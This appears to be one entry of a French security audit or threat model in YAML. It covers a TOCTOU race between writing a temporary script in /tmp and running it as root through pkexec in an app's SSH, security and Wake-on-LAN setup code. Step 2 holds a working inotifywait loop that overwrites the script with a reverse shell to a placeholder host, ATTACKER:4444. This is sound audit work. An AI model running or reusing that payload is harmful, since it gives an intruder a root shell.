  - id: ATK-004
    vuln_refs: ["VULN-004"]
    category: FLT
    title: "Race condition TOCTOU pour injecter des commandes root via scripts temporaires"
    attacker_profile: "Attaquant avec acces root ou capacite de surveiller /tmp (processus co-localise)"
    attacker_skill_level: "expert"
    attacker_position: "local"
    preconditions:
      - "L'attaquant peut surveiller la creation de fichiers dans /tmp"
      - "L'utilisateur declenche une action qui ecrit un script temp (SSH setup, securite, WoL)"
      - "Privileges root ou meme proprietaire du fichier temp"
    attack_steps:
      - step: 1
        action: "Surveiller /tmp pour les fichiers chill_*"
        command: "inotifywait -m /tmp -e create --format '%f' | grep chill_"
        tool: "inotifywait"
        result: "Detection de la creation du script temporaire"
        detection_risk: "basse"
      - step: 2
        action: "Remplacer le contenu du script entre createTemp et pkexec"
        command: "#!/bin/bash\nwhile inotifywait -e create /tmp; do\n  f=$(ls -t /tmp/chill_* 2>/dev/null | head -1)\n  [ -n \"$f\" ] && echo 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1' > \"$f\"\ndone"
        tool: "inotifywait + bash"
        result: "Le script est modifie avant l'execution pkexec"
        detection_risk: "moyenne"
      - step: 3
        action: "pkexec execute le script modifie en root"
        command: "# L'app execute: CommandRunner.runElevated('bash', [tempScript.path])"
        tool: "pkexec (via l'app)"
        result: "Reverse shell root vers l'attaquant"
        detection_risk: "haute"
    impact: "Execution de commandes arbitraires en root. La fenetre TOCTOU entre writeAsString() et runElevated() permet l'injection."
    severity: HAUTE
    cvss: 7.0
    evidence:
      file: "lib/features/ssh_setup/ssh_setup_provider.dart"
      line: 287
      code: "await tempScript.writeAsString(script);\nresult = await CommandRunner.runElevated('bash', [tempScript.path]);"
      issue: "Fenetre de race entre ecriture et execution. Meme pattern dans security_commands.dart:293 et wol_setup_provider.dart:316."
    estimated_time: "1 heure (mise en place du monitoring)"
    tools_required: ["inotifywait", "bash", "privileges root ou meme utilisateur"]
    detection_difficulty: "moderee"
    indicators_of_compromise:
      - "Processus inotifywait surveillant /tmp"
      - "Scripts /tmp avec contenu inattendu"
      - "Connexions reseau sortantes depuis un processus root"

